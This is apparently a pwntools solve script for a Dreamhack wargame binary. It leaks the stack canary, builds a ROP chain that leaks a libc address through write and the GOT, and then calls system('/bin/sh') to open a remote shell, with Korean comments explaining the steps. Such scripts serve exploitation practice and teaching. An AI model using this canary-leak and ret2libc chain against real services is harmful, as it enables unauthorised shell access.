from pwn import *

context.arch = "amd64"
p = remote('host3.dreamhack.games', 18572)

e = ELF('./rop')
libc = ELF('./libc.so.6')

read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']

read_system_offset = libc.symbols['read'] - libc.symbols['system']
read_binsh_offset = libc.symbols['read'] - list(libc.search(b'/bin/sh'))[0]

r = ROP(e)

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

p.send(b'a'*0x39)
# p.sendafter(b'Buf: ', b'a'*0x39)
p.recvuntil(b'a'*0x39)
canary = b'\x00' + p.recvn(7)
payload = b'a'*0x38 + canary + b'a'*0x8

payload += p64(ret)

# first main

# write(1, read_got, ...)

payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# 여기서는 read_got를 읽어오고 더이상 instruction이 read 말고는 없으므로 system 콜을 직접적으로 하려면 main으로 다시 돌아가야함

payload += p64(main)

# p.send(payload)   
# 여기서는 p.send가 안되는 이유가 위에서 canary를 받을 때, recv 뒤에 남은게 read에 저장되버리기 때문에 b'Buf :' 이후에 보내서 받은걸 read에 저장해야 하기 때문에 sendafter를 해줘야함
p.sendafter(b'Buf: ', payload)
read = p.recvn(6) + b'\x00'*0x2
# read = p.recvn(8)
system = u64(read) - read_system_offset
binsh = u64(read) - read_binsh_offset

print(hex(u64(read)))

# second main

payload = b'a'*0x38 + canary + b'a'*0x8

p.send(payload)
# p.sendafter(b'Buf: ', payload)

payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.interactive()
